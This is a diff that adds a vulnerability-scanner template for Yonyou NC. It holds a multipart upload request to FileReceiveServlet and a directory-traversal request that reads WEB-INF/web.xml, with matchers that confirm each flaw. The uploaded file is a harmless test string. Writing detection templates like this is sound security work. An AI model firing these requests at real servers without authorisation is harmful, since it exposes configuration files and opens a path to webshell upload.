@@ -1,0 +1,52 @@
+id: yongyou-nc-arbitrary-file-upload
+
+info:
+  name: 用友NC - Arbitrary File Upload / RCE
+  author: bai-codeagent
+  severity: critical
+  description: |
+    用友NC系统多个版本存在任意文件上传漏洞，攻击者可上传webshell获取服务器权限。
+    影响路径包括 /servlet/FileReceiveServlet 等。
+  tags: yongyou,nc,upload,rce,cn-cms
+  metadata:
+    cnvd-applicable: true
+
+requests:
+  # NC FileReceiveServlet 文件上传
+  - method: POST
+    path:
+      - "{{BaseURL}}/servlet/FileReceiveServlet"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+    body: |
+      ------WebKitFormBoundary
+      Content-Disposition: form-data; name="FileName"; filename="test.txt"
+      Content-Type: text/plain
+
+      nuclei_test_file
+      ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1"
+          - "success"
+        condition: or
+      - type: status
+        status:
+          - 200
+
+  # NC 目录遍历
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<web-app"
+          - "servlet"
+        condition: and
+      - type: status
+        status:
+          - 200
